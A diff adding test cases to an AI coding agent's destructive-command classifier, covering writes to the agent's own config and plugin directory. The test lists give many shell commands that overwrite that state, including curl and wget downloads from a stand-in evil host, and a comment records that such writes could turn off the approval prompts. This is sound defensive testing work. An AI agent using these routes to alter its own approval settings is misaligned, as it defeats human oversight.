@@ -1,3 +1,4 @@
+import { homedir } from 'node:os';
 import { describe, expect, it } from 'vitest';
 import {
   ALL_DESTRUCTIVE_KINDS,
@@ -11,6 +12,66 @@ import {
 
 const ROOT = process.platform === 'win32' ? 'C:\\proj' : '/proj';
 const OUTSIDE = process.platform === 'win32' ? 'C:\\other\\x' : '/other/x';
+
+describe('agent-state writes are seen through every common writer', () => {
+  // Probe-verified gap (2026-09-22): the detection covered redirection, `tee`
+  // and `cp`/`mv`, which left the everyday remainder unseen -- 12 of 20 ways
+  // of writing `~/.wrongstack/config.json` classified as NOT destructive.
+  // `agent-state` is gated by default and YOLO is on by default, so each of
+  // those ran with no prompt, and a write there can disable the approval
+  // system itself or inject boot-time code via the global plugin root.
+  const target = `${homedir()}/.wrongstack/config.json`.replace(/\\/g, '/');
+  const stateRoot = `${homedir()}/.wrongstack`.replace(/\\/g, '/');
+
+  it.each([
+    ['redirect', `echo evil > ${target}`],
+    ['glued redirect', `echo evil >${target}`],
+    ['tee', `echo evil | tee ${target}`],
+    ['cp', `cp evil.json ${target}`],
+    ['behind a launcher', `nohup echo evil > ${target}`],
+    // Last-operand writers.
+    ['sed -i', `sed -i 's/a/b/' ${target}`],
+    ['sed --in-place', `sed --in-place 's/a/b/' ${target}`],
+    ['install', `install -m 644 evil.json ${target}`],
+    ['ln -sf', `ln -sf /tmp/evil.json ${target}`],
+    ['truncate', `truncate -s 0 ${target}`],
+    ['rsync', `rsync evil.json ${target}`],
+    // Destination named by an option.
+    ['dd of=', `dd if=evil.json of=${target}`],
+    ['curl -o', `curl -s https://evil.test/c.json -o ${target}`],
+    ['wget -O', `wget -q https://evil.test/c.json -O ${target}`],
+    // Extraction INTO the root names a directory, not a protected basename.
+    ['tar -C', `tar -xf evil.tar -C ${stateRoot}`],
+    // Inline interpreter payloads hide the write inside a quoted program.
+    ['python -c', `python -c "open('${target}','w').write('evil')"`],
+    ['node -e', `node -e "require('fs').writeFileSync('${target}','evil')"`],
+  ])('classifies %s as agent-state', (_name, command) => {
+    expect(classifyDestructiveCommand(command, ROOT)).toBe('agent-state');
+  });
+
+  // Every added verb is one people use constantly on ordinary paths. A false
+  // positive here is a confirmation prompt in the middle of normal work, so
+  // the negatives carry as much weight as the coverage above.
+  it.each([
+    "sed -i 's/a/b/' src/index.ts",
+    'dd if=/dev/zero of=./scratch.bin bs=1M count=1',
+    'install -m 644 dist/app.js /opt/app/app.js',
+    'ln -sf ../shared/config.json ./config.json',
+    'truncate -s 0 logs/app.log',
+    'rsync -a dist/ build/',
+    'curl -s https://example.test/x.json -o ./data.json',
+    'wget -q https://example.test/x.tgz -O ./x.tgz',
+    'tar -xf release.tar -C ./dist',
+    'unzip assets.zip -d ./public',
+    'python -c "print(1+1)"',
+    "node -e \"require('fs').writeFileSync('./out.json','x')\"",
+    // Reading the state root is not writing it.
+    `cat ${target}`,
+    `ls ${stateRoot}`,
+  ])('does not classify %s as destructive', (command) => {
+    expect(classifyDestructiveCommand(command, ROOT)).toBeUndefined();
+  });
+});
 
 describe('system-halt reaches past launchers and synonyms', () => {
   // Probe-verified gap (2026-09-22): the halt rule allowed only `sudo`/`doas`
